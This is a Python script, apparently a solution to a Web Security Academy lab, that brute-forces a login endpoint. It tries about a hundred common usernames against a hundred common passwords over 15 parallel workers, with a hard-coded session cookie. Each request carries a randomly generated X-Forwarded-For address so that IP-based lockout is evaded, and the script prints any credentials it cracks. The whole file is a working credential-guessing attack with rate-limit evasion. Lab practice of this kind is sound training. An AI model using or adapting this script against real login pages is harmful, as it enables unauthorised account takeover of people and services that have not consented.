#!/usr/bin/python3

import requests
import string
import datetime
import time
from multiprocessing import Pool

import random
import socket
import struct

password_list = [
"123456",
"password",
"12345678",
"qwerty",
"123456789",
"12345",
"1234",
"111111",
"1234567",
"dragon",
"123123",
"baseball",
"abc123",
"football",
"monkey",
"letmein",
"shadow",
"master",
"666666",
"qwertyuiop",
"123321",
"mustang",
"1234567890",
"michael",
"654321",
"superman",
"1qaz2wsx",
"7777777",
"121212",
"000000",
"qazwsx",
"123qwe",
"killer",
"trustno1",
"jordan",
"jennifer",
"zxcvbnm",
"asdfgh",
"hunter",
"buster",
"soccer",
"harley",
"batman",
"andrew",
"tigger",
"sunshine",
"iloveyou",
"2000",
"charlie",
"robert",
"thomas",
"hockey",
"ranger",
"daniel",
"starwars",
"klaster",
"112233",
"george",
"computer",
"michelle",
"jessica",
"pepper",
"1111",
"zxcvbn",
"555555",
"11111111",
"131313",
"freedom",
"777777",
"pass",
"maggie",
"159753",
"aaaaaa",
"ginger",
"princess",
"joshua",
"cheese",
"amanda",
"summer",
"love",
"ashley",
"nicole",
"chelsea",
"biteme",
"matthew",
"access",
"yankees",
"987654321",
"dallas",
"austin",
"thunder",
"taylor",
"matrix",
"mobilemail",
"mom",
"monitor",
"monitoring",
"montana",
"moon",
"moscow"
]

username_list = [
"carlos",
"root",
"admin",
"test",
"guest",
"info",
"adm",
"mysql",
"user",
"administrator",
"oracle",
"ftp",
"pi",
"puppet",
"ansible",
"ec2-user",
"vagrant",
"azureuser",
"academico",
"acceso",
"access",
"accounting",
"accounts",
"acid",
"activestat",
"ad",
"adam",
"adkit",
"admin",
"administracion",
"administrador",
"administrator",
"administrators",
"admins",
"ads",
"adserver",
"adsl",
"ae",
"af",
"affiliate",
"affiliates",
"afiliados",
"ag",
"agenda",
"agent",
"ai",
"aix",
"ajax",
"ak",
"akamai",
"al",
"alabama",
"alaska",
"albuquerque",
"alerts",
"alpha",
"alterwind",
"am",
"amarillo",
"americas",
"an",
"anaheim",
"analyzer",
"announce",
"announcements",
"antivirus",
"ao",
"ap",
"apache",
"apollo",
"app",
"app01",
"app1",
"apple",
"application",
"applications",
"apps",
"appserver",
"aq",
"ar",
"archie",
"arcsight",
"argentina",
"arizona",
"arkansas",
"arlington",
"as",
"as400",
"asia",
"asterix",
"at",
"athena",
"atlanta",
"atlas",
"att",
"au",
"auction",
"austin",
"auth",
"auto",
"autodiscover"
]

ip_list = []

for n in range(0x00000008, 0x0000a001):
    ip_list.append(socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff))))

wordlist = []
counter = 0

for i in username_list:
    for j in password_list:
        wordlist.append((i, j, ip_list[counter]))
        counter += 1

session = 'S9XhSjQXtbtBEHnLVrjqs1DTH54KyNDY'
endpoint = "https://0a15004b044c22fac03e286e00ac0006.web-security-academy.net/login"
check_string = 'Login'

def bruteforce(_username, _password, _ip):
    data = {"username": _username, "password": _password}
    cookies = {"session": session}
    headers = {'X-Forwarded-For': _ip}
    r = requests.post(endpoint,cookies=cookies,data=data,headers=headers)
    if check_string not in r.text:
        print("Cracked username and password: " + _username + ":" + _password)
    if "You have made too many incorrect login attempts. Please try again in 30 minute(s)." in r.text:
        print("you messed up!")

if __name__ == '__main__':
    with Pool(15) as mp_pool:
        mp_pool.starmap(bruteforce, wordlist)
        
# https://stackoverflow.com/questions/21014618/python-randomly-generated-ip-address-as-string
# https://requests.readthedocs.io/en/latest/user/quickstart/#custom-headers
